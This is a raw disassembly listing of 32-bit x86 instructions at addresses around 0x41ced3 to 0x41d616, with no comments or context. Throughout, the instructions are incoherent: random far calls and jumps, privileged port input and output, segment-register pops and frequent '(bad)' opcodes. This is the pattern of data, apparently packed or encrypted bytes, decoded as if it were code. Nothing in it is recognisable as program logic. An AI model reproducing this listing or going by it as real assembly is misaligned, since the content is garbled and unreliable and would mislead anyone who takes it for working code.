  41ced3:	call   0xc395:0xb15919c7
  41ceda:	jb     0x41ce70
  41cedc:	sti    
  41cedd:	push   DWORD PTR [edi-0x66]
  41cee0:	int3   
  41cee1:	test   BYTE PTR [edx-0x6a],al
  41cee4:	xchg   edi,eax
  41cee5:	fldlg2 
  41cee7:	in     al,0x90
  41cee9:	and    DWORD PTR [edx+ecx*2+0x5d244194],ebx
  41cef0:	mov    bl,BYTE PTR [ebp+ecx*1-0x7061f9df]
  41cef7:	or     eax,0x9fe5fe77
  41cefc:	loop   0x41cf71
  41cefe:	inc    eax
  41ceff:	mov    BYTE PTR [ecx+0x7ddfdde5],ah
  41cf05:	out    0x5b,eax
  41cf07:	xor    cl,cl
  41cf09:	pushf  
  41cf0a:	sub    eax,0x8204f0f6
  41cf0f:	jle    0x41cf31
  41cf11:	xchg   esi,eax
  41cf12:	or     eax,0xc2241d1
  41cf17:	xor    ch,BYTE PTR [ebx-0x6d]
  41cf1a:	push   esi
  41cf1b:	pop    ds
  41cf1c:	cmp    edx,DWORD PTR [edi+0x5b]
  41cf1f:	mov    ecx,0x690e2019
  41cf24:	aad    0x20
  41cf26:	mov    ebx,0xb9f07175
  41cf2b:	push   ds
  41cf2c:	and    esp,esi
  41cf2e:	pop    eax
  41cf2f:	pop    eax
  41cf30:	pop    edx
  41cf31:	call   0xdc3b:0xb044db9
  41cf38:	stc    
  41cf39:	in     al,0x34
  41cf3b:	mov    es,WORD PTR [esi]
  41cf3d:	xor    dh,BYTE PTR [eax-0x373cd280]
  41cf43:	cmp    al,0xfe
  41cf45:	cmp    dl,dl
  41cf47:	shl    BYTE PTR [ecx-0x507c2ab7],0x74
  41cf4e:	fld    TBYTE PTR [eax]
  41cf50:	arpl   dx,ax
  41cf52:	ins    DWORD PTR es:[edi],dx
  41cf53:	or     BYTE PTR [ebp+0x4d],cl
  41cf56:	int3   
  41cf57:	jb     0x41cf10
  41cf59:	aad    0xef
  41cf5b:	ins    BYTE PTR es:[edi],dx
  41cf5c:	jns    0x41cf9e
  41cf5e:	mov    dh,BYTE PTR [edx+esi*8+0x5d]
  41cf62:	lods   al,BYTE PTR ds:[esi]
  41cf63:	mov    dl,0xe4
  41cf65:	pop    esp
  41cf66:	push   ds
  41cf67:	outs   dx,BYTE PTR ds:[esi]
  41cf68:	push   es
  41cf69:	arpl   WORD PTR [ecx+0x3f],ax
  41cf6c:	dec    ecx
  41cf6d:	ins    BYTE PTR es:[edi],dx
  41cf6e:	xor    eax,0xc229428b
  41cf73:	mov    ebp,esi
  41cf75:	enter  0x7e79,0x5b
  41cf79:	mov    ds:0x79b84e72,al
  41cf7e:	jge    0x41cf43
  41cf80:	pop    ds
  41cf81:	lods   eax,DWORD PTR ds:[esi]
  41cf82:	aaa    
  41cf83:	xchg   esp,eax
  41cf84:	sub    esp,DWORD PTR [ecx-0x26536ee6]
  41cf8a:	test   eax,0xdfeaf45c
  41cf8f:	mov    eax,ds:0xe99f65dd
  41cf94:	(bad)  
  41cf95:	jne    0x41d010
  41cf97:	xor    eax,0xb7c706b0
  41cf9c:	adc    dl,al
  41cf9e:	(bad)  
  41cf9f:	fwait
  41cfa0:	retf   
  41cfa1:	pop    ds
  41cfa2:	cmp    ah,BYTE PTR [edx-0x51]
  41cfa5:	push   esp
  41cfa6:	adc    esp,DWORD PTR [edi-0x39e18158]
  41cfac:	in     al,0x1b
  41cfae:	mov    al,0x16
  41cfb0:	scas   al,BYTE PTR es:[edi]
  41cfb1:	xchg   ebp,eax
  41cfb2:	dec    eax
  41cfb3:	adc    eax,DWORD PTR [edi]
  41cfb5:	add    BYTE PTR [ecx],0x2a
  41cfb8:	xor    al,0x1b
  41cfba:	arpl   sp,di
  41cfbc:	add    al,0x2a
  41cfbe:	lahf   
  41cfbf:	cmp    BYTE PTR ds:0x14f10e17,ah
  41cfc5:	lahf   
  41cfc6:	clc    
  41cfc7:	push   ecx
  41cfc8:	fdivr  DWORD PTR [ecx]
  41cfca:	je     0x41cf56
  41cfcc:	and    edx,DWORD PTR [ebx-0x55479e06]
  41cfd2:	sub    BYTE PTR [edx-0x55],ah
  41cfd5:	jecxz  0x41cff8
  41cfd7:	in     eax,dx
  41cfd8:	adc    BYTE PTR [ecx-0x709571fb],ah
  41cfde:	mov    bh,0x70
  41cfe0:	add    BYTE PTR [esi-0x4],dl
  41cfe3:	ret    0xf538
  41cfe6:	sbb    eax,0xb760410
  41cfeb:	pop    esp
  41cfec:	test   al,al
  41cfee:	mov    ecx,0xf4580575
  41cff3:	xor    ecx,0x14637854
  41cff9:	fisttp WORD PTR [ebx]
  41cffb:	inc    ebx
  41cffc:	push   0xb7cbeada
  41d001:	pop    esp
  41d002:	add    DWORD PTR [eax+0x68],ebx
  41d005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d006:	mov    edi,0x9bb06629
  41d00b:	(bad)  
  41d00c:	ret    
  41d00d:	add    bl,BYTE PTR [edx+edi*8-0x6822632d]
  41d014:	dec    edx
  41d015:	std    
  41d016:	sti    
  41d017:	push   es
  41d018:	retf   0x41fc
  41d01b:	jne    0x41cfc9
  41d01d:	test   BYTE PTR [ecx+edi*1+0x5a],bl
  41d021:	popa   
  41d022:	sbb    DWORD PTR [esi],ebp
  41d024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d025:	jbe    0x41d074
  41d027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d029:	inc    esp
  41d02a:	mov    ecx,0xfeecb29b
  41d02f:	div    BYTE PTR [esi]
  41d031:	fwait
  41d032:	push   ds
  41d033:	push   gs
  41d035:	push   edi
  41d036:	push   ds
  41d037:	adc    eax,DWORD PTR [edx+0x538c71bb]
  41d03d:	out    dx,al
  41d03e:	leave  
  41d03f:	idiv   DWORD PTR [ecx-0x53674383]
  41d045:	(bad)  
  41d046:	push   ds
  41d047:	mov    esp,0xf1f809d1
  41d04c:	rol    ebp,1
  41d04e:	aad    0x84
  41d050:	cdq    
  41d051:	icebp  
  41d052:	xor    BYTE PTR [esi],cl
  41d054:	mov    edi,fs
  41d056:	fsub   st(0),st
  41d058:	push   ebx
  41d059:	mov    edx,0xab6d4513
  41d05e:	add    DWORD PTR [ecx-0x75],ecx
  41d061:	test   al,0x4c
  41d063:	jbe    0x41d0ae
  41d065:	dec    edx
  41d066:	mov    cl,0xc8
  41d068:	xchg   esi,eax
  41d069:	lahf   
  41d06a:	int    0xfb
  41d06c:	or     bl,ah
  41d06e:	fnstcw WORD PTR [ecx-0x6c]
  41d071:	jmp    0x43e5:0x676c05df
  41d078:	cli    
  41d079:	test   BYTE PTR [edx+0x1e],0x76
  41d07d:	jg     0x41d0ab
  41d07f:	pop    ds
  41d080:	sbb    BYTE PTR [edx],bl
  41d082:	push   ds
  41d083:	xor    bl,BYTE PTR [esp+edi*1-0x2cd40e8c]
  41d08a:	retf   
  41d08b:	repz inc ecx
  41d08d:	test   BYTE PTR [ebx+0x57],al
  41d090:	pop    ebp
  41d091:	not    DWORD PTR [eax-0x4cb1ba86]
  41d097:	popa   
  41d098:	scas   eax,DWORD PTR es:[edi]
  41d099:	pop    ecx
  41d09a:	fdiv   DWORD PTR [esi]
  41d09c:	xor    al,0x20
  41d09e:	ins    BYTE PTR es:[edi],dx
  41d09f:	xlat   BYTE PTR ds:[ebx]
  41d0a0:	push   es
  41d0a1:	add    ah,dl
  41d0a3:	test   al,0x1a
  41d0a5:	(bad)  
  41d0a6:	out    0xcd,eax
  41d0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0a9:	ins    DWORD PTR es:[edi],dx
  41d0aa:	in     eax,dx
  41d0ab:	xchg   ebp,eax
  41d0ac:	fwait
  41d0ad:	test   eax,0xf4a3f198
  41d0b2:	and    edx,DWORD PTR ds:[ecx]
  41d0b5:	cdq    
  41d0b6:	shl    BYTE PTR [esi+0x5131c273],1
  41d0bc:	sbb    eax,0x8c65dde0
  41d0c1:	outs   dx,BYTE PTR ds:[esi]
  41d0c2:	pop    ebx
  41d0c3:	iret   
  41d0c4:	jmp    DWORD PTR [edi]
  41d0c6:	cwde   
  41d0c7:	dec    esi
  41d0c8:	dec    BYTE PTR [ecx]
  41d0ca:	xchg   esi,eax
  41d0cb:	test   BYTE PTR [esi-0x535ccbe],al
  41d0d1:	call   0x2b2a:0x671aa99f
  41d0d8:	sbb    eax,0x599e8e33
  41d0dd:	test   eax,0x2f76683d
  41d0e2:	xchg   ecx,eax
  41d0e3:	mov    ebx,0xe201d0f4
  41d0e8:	sub    DWORD PTR [eax],eax
  41d0ea:	xchg   BYTE PTR [ecx-0x4a],bl
  41d0ed:	mov    BYTE PTR [esi+0x39e64277],cl
  41d0f3:	adc    eax,DWORD PTR [esi+0x2c42c5b3]
  41d0f9:	sbb    DWORD PTR [ecx-0x19],ebp
  41d0fc:	jne    0x41d106
  41d0fe:	les    edx,FWORD PTR [ecx]
  41d100:	push   es
  41d101:	addr16 sti 
  41d103:	outs   dx,BYTE PTR ds:[esi]
  41d104:	jp     0x41d0a3
  41d106:	pop    esi
  41d107:	mov    edx,0xf594b97e
  41d10c:	cld    
  41d10d:	(bad)  
  41d10e:	adc    esi,DWORD PTR [edi+0x1e40008]
  41d114:	jmp    0x41d191
  41d116:	jnp    0x41d0b9
  41d118:	imul   BYTE PTR [ebx+0x5045d5d3]
  41d11e:	cli    
  41d11f:	push   ecx
  41d120:	lea    ecx,[ebp+0x19511333]
  41d126:	sar    DWORD PTR [eax+0x8],1
  41d129:	xor    BYTE PTR [edx-0x4a],0xf1
  41d12d:	pop    es
  41d12e:	stc    
  41d12f:	jp     0x41d192
  41d131:	int    0xb4
  41d133:	popf   
  41d134:	adc    BYTE PTR [esi+0x7],al
  41d137:	pop    fs
  41d139:	shl    BYTE PTR [esp+eiz*4-0x6d],0x64
  41d13e:	cmp    al,0x61
  41d140:	cmp    ebp,ecx
  41d142:	xor    al,0x6b
  41d144:	into   
  41d145:	push   0x5a588c33
  41d14a:	mov    ecx,0xbe0c09eb
  41d14f:	cmp    eax,0x529c1d29
  41d154:	dec    esi
  41d155:	adc    BYTE PTR [ebp+0x45fda5fd],bl
  41d15b:	das    
  41d15c:	lock fadd DWORD PTR [ecx]
  41d15f:	mov    ah,0x16
  41d161:	mov    esp,0x20184ba2
  41d166:	mov    bh,0x71
  41d168:	pusha  
  41d169:	push   ebp
  41d16a:	push   edi
  41d16b:	ins    DWORD PTR es:[edi],dx
  41d16c:	pop    es
  41d16d:	arpl   WORD PTR [ebx-0x21],dx
  41d170:	mov    edi,0x55f1c93f
  41d175:	cwde   
  41d176:	sub    edx,DWORD PTR [ecx-0x78]
  41d179:	leave  
  41d17a:	sbb    ch,dh
  41d17c:	sahf   
  41d17d:	jmp    0x41d1c9
  41d17f:	push   ss
  41d180:	pop    edx
  41d181:	adc    BYTE PTR [esi-0x55f43cdb],dh
  41d187:	mov    es,WORD PTR ds:[edi+ebx*8]
  41d18b:	mul    BYTE PTR [ebp-0x45]
  41d18e:	fsubr  QWORD PTR [ecx]
  41d190:	sbb    ecx,ebx
  41d192:	imul   DWORD PTR [ebp+0x18aaf3f5]
  41d198:	cdq    
  41d199:	sbb    ecx,DWORD PTR [edi+esi*4]
  41d19c:	adc    ecx,ebp
  41d19e:	sub    al,0x61
  41d1a0:	jmp    0x4b47649c
  41d1a5:	mov    ch,0xd
  41d1a7:	xchg   DWORD PTR [ebx],ebp
  41d1a9:	test   BYTE PTR [edi+0x77],cl
  41d1ac:	retf   
  41d1ad:	inc    ecx
  41d1ae:	or     bl,BYTE PTR [esi+esi*2-0x7]
  41d1b2:	and    al,BYTE PTR [edx-0x1d]
  41d1b5:	and    DWORD PTR [eax],ebp
  41d1b7:	loop   0x41d21f
  41d1b9:	bound  esi,QWORD PTR [ebp-0x14c31ffa]
  41d1bf:	inc    ebx
  41d1c0:	push   0xffffffeb
  41d1c2:	popf   
  41d1c3:	pop    ecx
  41d1c4:	jecxz  0x41d14f
  41d1c6:	(bad)  
  41d1c7:	fs sbb esi,edi
  41d1ca:	mov    edx,0xd7ece3af
  41d1cf:	xchg   DWORD PTR [esi+edi*1-0x2c],esp
  41d1d3:	cmp    al,0xf3
  41d1d5:	es inc esp
  41d1d7:	dec    edi
  41d1d8:	dec    esp
  41d1d9:	arpl   WORD PTR [esi-0x65dae8d9],ax
  41d1df:	push   esi
  41d1e0:	inc    ebp
  41d1e1:	mov    cl,BYTE PTR [esi-0x55]
  41d1e4:	fisttp QWORD PTR [ebx-0x2b2480a]
  41d1ea:	mov    ds:0x7b9b9ffe,al
  41d1ef:	(bad)  
  41d1f0:	sar    BYTE PTR [edx-0x204cc40a],1
  41d1f6:	les    eax,FWORD PTR [ecx+0x3ab90392]
  41d1fc:	mov    ebx,0x4f6e3830
  41d201:	fiadd  DWORD PTR [ebx+0x13dd4cad]
  41d207:	sbb    DWORD PTR [ebx+0x1cc411db],edx
  41d20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d20e:	rol    BYTE PTR [esi],1
  41d210:	inc    esp
  41d211:	call   0x3decfa39
  41d216:	mov    esi,0x9890e8d7
  41d21b:	lds    ebx,FWORD PTR [esi]
  41d21d:	or     ebx,edx
  41d21f:	in     al,dx
  41d220:	aas    
  41d221:	jns    0x41d238
  41d223:	mov    ebp,0x5a630e3b
  41d228:	test   al,0xcb
  41d22a:	pop    esp
  41d22b:	retf   0x820a
  41d22e:	dec    ecx
  41d22f:	outs   dx,DWORD PTR ds:[esi]
  41d230:	arpl   bx,ax
  41d232:	inc    esp
  41d233:	mov    cl,0x68
  41d235:	and    ebp,DWORD PTR [ecx]
  41d237:	mov    ch,0xa4
  41d239:	dec    edx
  41d23a:	out    dx,eax
  41d23b:	push   cs
  41d23c:	or     al,0x68
  41d23e:	es test bh,bh
  41d241:	lods   al,BYTE PTR ds:[esi]
  41d242:	in     al,0xf5
  41d244:	in     al,0x2e
  41d246:	mov    ah,0x66
  41d248:	adc    al,0xea
  41d24a:	mov    ch,BYTE PTR [ebx]
  41d24c:	mov    BYTE PTR [eax+0x456a8b40],cl
  41d252:	rcr    DWORD PTR [edx],cl
  41d254:	in     al,0xc8
  41d256:	out    dx,eax
  41d257:	test   eax,0xf048a5a9
  41d25c:	pusha  
  41d25d:	and    ebp,edi
  41d25f:	xchg   ch,ch
  41d261:	pop    ebx
  41d262:	sub    al,ah
  41d264:	sbb    eax,0x5e71314f
  41d269:	sub    BYTE PTR [ebx],al
  41d26b:	mov    BYTE PTR [ebx+0x3d],bh
  41d26e:	sahf   
  41d26f:	icebp  
  41d270:	jecxz  0x41d1f3
  41d272:	test   ecx,edi
  41d274:	lock in al,0x5f
  41d277:	push   ebp
  41d278:	xchg   BYTE PTR [ebx],dl
  41d27a:	outs   dx,DWORD PTR ds:[esi]
  41d27b:	fstp   QWORD PTR [ebx+0x47cfbd2c]
  41d281:	jecxz  0x41d2a6
  41d283:	jl     0x41d283
  41d285:	push   cs
  41d286:	cmp    BYTE PTR [ebx],bl
  41d288:	(bad)  
  41d289:	fsubrp st(5),st
  41d28b:	jmp    0x41d2a0
  41d28d:	ret    
  41d28e:	clc    
  41d28f:	mov    dh,0x71
  41d291:	test   BYTE PTR [edx+ecx*8-0x69697e21],dh
  41d298:	push   esi
  41d299:	or     ebp,ecx
  41d29b:	push   ss
  41d29c:	adc    ebp,esp
  41d29e:	and    cl,ah
  41d2a0:	sub    BYTE PTR [edi],ch
  41d2a2:	cmp    esi,DWORD PTR [edx-0x3ff49918]
  41d2a8:	jne    0x41d29c
  41d2aa:	sbb    DWORD PTR ds:0xe6beb8d3,esp
  41d2b0:	mov    ecx,0x9f0a2556
  41d2b5:	repz loopne 0x41d285
  41d2b8:	out    0x32,al
  41d2ba:	mov    ss,WORD PTR [ebp-0x3fc21222]
  41d2c0:	or     al,0x46
  41d2c2:	xchg   BYTE PTR [eax],cl
  41d2c4:	push   eax
  41d2c5:	mov    BYTE PTR [eax+esi*4+0x41d20029],0x14
  41d2cd:	xchg   ecx,eax
  41d2ce:	ds mov eax,0xa92df2e9
  41d2d4:	mov    dl,0xe3
  41d2d6:	leave  
  41d2d7:	outs   dx,DWORD PTR ds:[esi]
  41d2d8:	inc    ebp
  41d2d9:	and    al,0xb8
  41d2db:	pushf  
  41d2dc:	ins    DWORD PTR es:[edi],dx
  41d2dd:	xchg   esp,eax
  41d2de:	push   ds
  41d2df:	aas    
  41d2e0:	xchg   ebx,eax
  41d2e1:	(bad)  
  41d2e2:	mov    al,0xbb
  41d2e4:	jae    0x41d2ea
  41d2e6:	lds    ebx,FWORD PTR [edx+0x23c39993]
  41d2ec:	and    bh,ch
  41d2ee:	sbb    DWORD PTR [eax],0xefa295ec
  41d2f4:	add    BYTE PTR [eax+eax*2-0x34],dl
  41d2f8:	sub    esi,edx
  41d2fa:	xor    ebx,eax
  41d2fc:	add    al,0x59
  41d2fe:	xchg   ebx,eax
  41d2ff:	inc    edi
  41d300:	mov    edi,0xf40b6498
  41d305:	mov    BYTE PTR [ebx-0x4ce8fa1c],ch
  41d30b:	test   al,0x6a
  41d30d:	pop    ecx
  41d30e:	cdq    
  41d30f:	mov    ebp,0x85550426
  41d314:	add    BYTE PTR [edi*4+0x1cc67c41],ch
  41d31b:	push   esi
  41d31c:	test   edi,ebp
  41d31e:	pop    edx
  41d31f:	ror    DWORD PTR [ecx+esi*4-0x27991479],cl
  41d326:	mov    dl,0xdb
  41d328:	add    ebx,DWORD PTR [eax+0x6050a5b1]
  41d32e:	in     eax,0x91
  41d330:	jae    0x41d2bc
  41d332:	fild   DWORD PTR [esi+0x5]
  41d335:	xor    eax,0x333452a4
  41d33a:	mov    al,0xf0
  41d33c:	inc    edx
  41d33d:	push   eax
  41d33e:	jle    0x41d345
  41d340:	cmp    ecx,DWORD PTR ds:0x52c3d444
  41d346:	xor    ebx,esp
  41d348:	cs dec esp
  41d34a:	sub    dh,BYTE PTR [ebx-0xc]
  41d34d:	mov    dh,0x7a
  41d34f:	dec    ebp
  41d350:	clc    
  41d351:	xchg   ebx,eax
  41d352:	mov    edi,0xfda584fb
  41d358:	mov    dl,0x64
  41d35a:	(bad)
  41d35d:	jecxz  0x41d3a0
  41d35f:	mov    edx,0x2ed046cb
  41d364:	xchg   BYTE PTR [esi-0x75f87b65],bh
  41d36a:	fbld   TBYTE PTR [ecx+0x2f]
  41d36d:	out    0xe5,al
  41d36f:	sub    al,0xe8
  41d371:	(bad)  
  41d372:	cmc    
  41d373:	add    BYTE PTR [esi+0x6a0d3645],cl
  41d379:	out    dx,eax
  41d37a:	cmp    al,0xdc
  41d37c:	xor    DWORD PTR [esi+0x7e7dc0d6],esi
  41d382:	add    esi,DWORD PTR [edi]
  41d384:	pop    edi
  41d385:	and    al,0xb0
  41d387:	mov    al,ds:0x40ef5be2
  41d38c:	jp     0x41d33d
  41d38e:	push   edi
  41d38f:	jl     0x41d405
  41d391:	mov    ds:0x14312b6d,eax
  41d396:	icebp  
  41d397:	popf   
  41d398:	dec    ebp
  41d399:	jge    0x41d37c
  41d39b:	jo     0x41d35e
  41d39d:	data16 jbe 0x41d354
  41d3a0:	leave  
  41d3a1:	mov    ds:0x4e8a91b5,eax
  41d3a6:	cld    
  41d3a7:	xor    eax,0x70f9fce5
  41d3ac:	add    eax,0x9ca54c37
  41d3b1:	mov    BYTE PTR [eax],ah
  41d3b3:	push   edi
  41d3b4:	shr    ebp,0xa0
  41d3b7:	push   ecx
  41d3b8:	sbb    eax,0xa15e5959
  41d3bd:	mov    al,0xa0
  41d3bf:	fadd   QWORD PTR [esi+eiz*2-0x3c]
  41d3c3:	ret    0x9359
  41d3c6:	mov    BYTE PTR [esi],dh
  41d3c8:	pop    edx
  41d3c9:	test   DWORD PTR [edi],edx
  41d3cb:	pop    es
  41d3cc:	jecxz  0x41d3df
  41d3ce:	push   ecx
  41d3cf:	lods   al,BYTE PTR ds:[esi]
  41d3d0:	data16 jne 0x41d3f7
  41d3d3:	js     0x41d41e
  41d3d5:	dec    ebp
  41d3d6:	jne    0x41d362
  41d3d8:	out    dx,al
  41d3d9:	jmp    0x41d435
  41d3db:	bnd jae 0x41d429
  41d3de:	sbb    bl,cl
  41d3e0:	cmp    eax,0xa6ee4dd2
  41d3e5:	mov    ecx,0xfabeb44b
  41d3ea:	xchg   DWORD PTR [edi+0x1a],ebx
  41d3ed:	loopne 0x41d410
  41d3ef:	test   DWORD PTR [esp+ecx*2-0x33],eax
  41d3f3:	push   0xffffff94
  41d3f5:	mov    edi,ecx
  41d3f7:	lock (bad) 
  41d3fa:	xchg   BYTE PTR ds:0x9d6f38e4,bl
  41d400:	arpl   WORD PTR [ebx-0x55],ax
  41d403:	scas   al,BYTE PTR es:[edi]
  41d404:	mov    edx,0x7c071afa
  41d409:	xchg   ebp,eax
  41d40a:	scas   al,BYTE PTR es:[edi]
  41d40b:	inc    edi
  41d40c:	pop    ss
  41d40d:	lock sti 
  41d40f:	inc    ebp
  41d410:	jmp    0xae212b83
  41d415:	mov    al,0x8f
  41d417:	fcom   DWORD PTR [ebx-0x5e]
  41d41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d41b:	gs popa 
  41d41d:	push   0xd
  41d41f:	pop    ecx
  41d420:	stos   BYTE PTR es:[edi],al
  41d421:	fsubp  st(1),st
  41d423:	pop    ecx
  41d424:	jl     0x41d3b6
  41d426:	pop    esp
  41d427:	mov    WORD PTR [ebx],ss
  41d429:	inc    esi
  41d42a:	mov    dl,0xbf
  41d42c:	pop    ds
  41d42d:	fbstp  TBYTE PTR ds:0x2af6e18b
  41d433:	dec    eax
  41d434:	add    al,0x86
  41d436:	jl     0x41d3c1
  41d438:	loop   0x41d413
  41d43a:	pop    es
  41d43b:	and    DWORD PTR [edx],edx
  41d43d:	popf   
  41d43e:	hlt    
  41d43f:	int    0x4b
  41d441:	ss and eax,0xb32c2c78
  41d447:	lahf   
  41d448:	ins    DWORD PTR es:[edi],dx
  41d449:	lahf   
  41d44a:	leave  
  41d44b:	or     edx,0x2
  41d44e:	xor    bh,dl
  41d450:	retf   
  41d451:	add    dl,BYTE PTR [ecx+0x6e]
  41d454:	push   ss
  41d455:	cmp    dl,BYTE PTR ds:0xa368442d
  41d45b:	push   ds
  41d45c:	push   esi
  41d45d:	repnz xchg esp,eax
  41d45f:	cs (bad) 
  41d461:	das    
  41d462:	ds sub al,0x1e
  41d466:	push   ebp
  41d467:	and    eax,0x2739196d
  41d46c:	xchg   edx,eax
  41d46d:	dec    eax
  41d46e:	lock in eax,dx
  41d470:	repnz cmp eax,0x6793c062
  41d476:	mov    ecx,0x70c2fe1
  41d47b:	or     BYTE PTR [esp+ebx*8+0x557e3d93],0x73
  41d483:	jp     0x41d4f7
  41d485:	jns    0x41d4cb
  41d487:	sub    ch,bl
  41d489:	(bad)  
  41d48a:	daa    
  41d48b:	int    0xee
  41d48d:	pop    edx
  41d48e:	outs   dx,DWORD PTR ds:[esi]
  41d48f:	cmp    edi,edi
  41d491:	rcl    BYTE PTR [ebx],0x99
  41d494:	mov    eax,ds:0xf7dd890
  41d499:	test   DWORD PTR [eax+edi*2+0x32bd197],eax
  41d4a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4a1:	jp     0x41d4ca
  41d4a3:	xor    BYTE PTR [edx],bl
  41d4a5:	push   ebx
  41d4a6:	ss mov eax,es
  41d4a9:	jp     0x41d4c0
  41d4ab:	test   al,0x93
  41d4ad:	fist   DWORD PTR [ebx+0xd18a897]
  41d4b3:	ss push ss
  41d4b5:	add    al,0xd0
  41d4b7:	mov    al,ds:0x5f1fde36
  41d4bc:	lahf   
  41d4bd:	out    0xf2,eax
  41d4bf:	popa   
  41d4c0:	repz xchg ecx,eax
  41d4c2:	in     eax,dx
  41d4c3:	xchg   edx,eax
  41d4c4:	in     al,dx
  41d4c5:	cli    
  41d4c6:	mov    esp,0xc6a5210c
  41d4cb:	mov    dh,0xd6
  41d4cd:	rcr    DWORD PTR [edi+0x30],cl
  41d4d0:	das    
  41d4d1:	dec    ebx
  41d4d2:	jmp    0x38fc8137
  41d4d7:	mov    WORD PTR [edi+0x1a],gs
  41d4da:	in     eax,0x2b
  41d4dc:	scas   al,BYTE PTR es:[edi]
  41d4dd:	adc    dh,BYTE PTR [ecx]
  41d4df:	pop    esi
  41d4e0:	push   eax
  41d4e1:	out    0xd0,al
  41d4e3:	xchg   edx,eax
  41d4e4:	outs   dx,BYTE PTR ds:[esi]
  41d4e5:	bound  eax,QWORD PTR [edx-0x19]
  41d4e8:	ret    0xfcfe
  41d4eb:	ins    BYTE PTR es:[edi],dx
  41d4ec:	or     al,0x8b
  41d4ee:	adc    cl,BYTE PTR [eax]
  41d4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f1:	out    0x9d,eax
  41d4f3:	pop    esi
  41d4f4:	icebp  
  41d4f5:	mov    ah,0x87
  41d4f7:	jge    0x41d511
  41d4f9:	neg    ecx
  41d4fb:	call   0xefea9398
  41d500:	push   edx
  41d501:	pop    ss
  41d502:	std    
  41d503:	mov    ecx,fs
  41d505:	lods   al,BYTE PTR ds:[esi]
  41d506:	xor    DWORD PTR [eax+0x5a7813c6],ecx
  41d50c:	imul   edx,DWORD PTR [ecx-0x1e6c96d3],0x75
  41d513:	inc    ebx
  41d514:	call   0x87c0:0x15081748
  41d51b:	shl    DWORD PTR [edx+0x41],1
  41d51e:	xchg   edx,eax
  41d51f:	(bad)  
  41d520:	fcom   QWORD PTR [esi]
  41d522:	lahf   
  41d523:	and    DWORD PTR [edx-0x69],esp
  41d526:	fiadd  DWORD PTR [eax]
  41d528:	fcmovbe st,st(2)
  41d52a:	xor    BYTE PTR [edi+edi*4-0x14],dl
  41d52e:	out    0x63,eax
  41d530:	and    eax,0x7a134818
  41d535:	mov    fs,WORD PTR [eax]
  41d537:	inc    esp
  41d538:	add    eax,0xc7e5d52d
  41d53d:	mov    BYTE PTR [ebx],ch
  41d53f:	std    
  41d540:	push   eax
  41d541:	mov    bh,0xdd
  41d543:	or     BYTE PTR [edi-0x34],cl
  41d546:	jp     0x41d566
  41d548:	xchg   edx,eax
  41d549:	pop    ss
  41d54a:	ja     0x41d536
  41d54c:	arpl   si,ax
  41d54e:	arpl   WORD PTR [eax],bp
  41d550:	push   ecx
  41d551:	stos   BYTE PTR es:[edi],al
  41d552:	or     dl,BYTE PTR [ebx-0x55]
  41d555:	test   DWORD PTR [edx],edx
  41d557:	xchg   esp,eax
  41d558:	push   0xffffffdb
  41d55a:	repnz div DWORD PTR [ebx+0x1c]
  41d55e:	inc    edi
  41d55f:	cmp    ch,dl
  41d561:	nop
  41d562:	dec    ebp
  41d563:	inc    eax
  41d564:	dec    edi
  41d565:	dec    ecx
  41d566:	(bad)
  41d56a:	xchg   DWORD PTR [edx-0x6f],esp
  41d56d:	and    al,0xa0
  41d56f:	add    al,0x9c
  41d571:	jge    0x41d4f7
  41d573:	mov    esi,0xe6ab688f
  41d578:	mov    WORD PTR [ebx+0x3ab3452f],gs
  41d57e:	or     al,al
  41d580:	nop
  41d581:	pop    eax
  41d582:	(bad)  
  41d583:	aad    0x1b
  41d585:	in     al,0x76
  41d587:	sti    
  41d588:	sub    bl,BYTE PTR [eax]
  41d58a:	(bad)  
  41d58b:	mov    edx,0xcfe47dcf
  41d590:	mov    esi,DWORD PTR cs:[esi]
  41d593:	push   ebx
  41d594:	inc    ecx
  41d595:	jecxz  0x41d578
  41d597:	aam    0xfa
  41d599:	cli    
  41d59a:	pop    es
  41d59b:	clc    
  41d59c:	dec    esi
  41d59d:	scas   al,BYTE PTR es:[edi]
  41d59e:	iret   
  41d59f:	in     al,dx
  41d5a0:	sbb    edx,esi
  41d5a2:	ds cs icebp 
  41d5a5:	jne    0x41d618
  41d5a7:	and    al,0x59
  41d5a9:	sub    DWORD PTR [ebx-0x2e],ebx
  41d5ac:	xchg   ecx,eax
  41d5ad:	mov    bl,al
  41d5af:	ins    DWORD PTR es:[edi],dx
  41d5b0:	jmp    0xe7a9f9b5
  41d5b5:	repz pushf 
  41d5b7:	inc    edx
  41d5b8:	adc    eax,0x66c72c3e
  41d5bd:	(bad)  
  41d5bf:	dec    eax
  41d5c0:	in     al,dx
  41d5c1:	pop    ecx
  41d5c2:	push   ebp
  41d5c3:	repnz lods eax,DWORD PTR ds:[esi]
  41d5c5:	push   cs
  41d5c6:	dec    esi
  41d5c7:	fidiv  WORD PTR ds:0x92888dda
  41d5cd:	cmp    edi,DWORD PTR [esi-0xf]
  41d5d0:	mov    eax,0x820d51ad
  41d5d5:	js     0x41d5e8
  41d5d7:	mov    al,ds:0xe03b8ea4
  41d5dc:	jge    0x41d615
  41d5de:	xor    ah,ah
  41d5e0:	je     0x41d581
  41d5e2:	push   es
  41d5e3:	pop    esp
  41d5e4:	pop    edi
  41d5e5:	fsub   DWORD PTR [esi+0x20c412c9]
  41d5eb:	cs addr16 cs sbb bh,dl
  41d5f0:	push   cs
  41d5f1:	ins    BYTE PTR es:[edi],dx
  41d5f2:	outs   dx,BYTE PTR ds:[esi]
  41d5f3:	rcr    DWORD PTR ds:0x4a3f71b1,0x20
  41d5fa:	imul   ebp,DWORD PTR [eax-0x51554174],0x5d
  41d601:	je     0x41d65b
  41d603:	mov    esi,DWORD PTR [ecx+eiz*2]
  41d606:	and    edx,esi
  41d608:	pop    esi
  41d609:	jge    0x41d630
  41d60b:	test   DWORD PTR [esi],ecx
  41d60d:	pop    ds
  41d60e:	shl    DWORD PTR ds:0xb2b8d709,1
  41d614:	in     al,0xba
  41d616:	addr16 imul ecx,eax,0x22
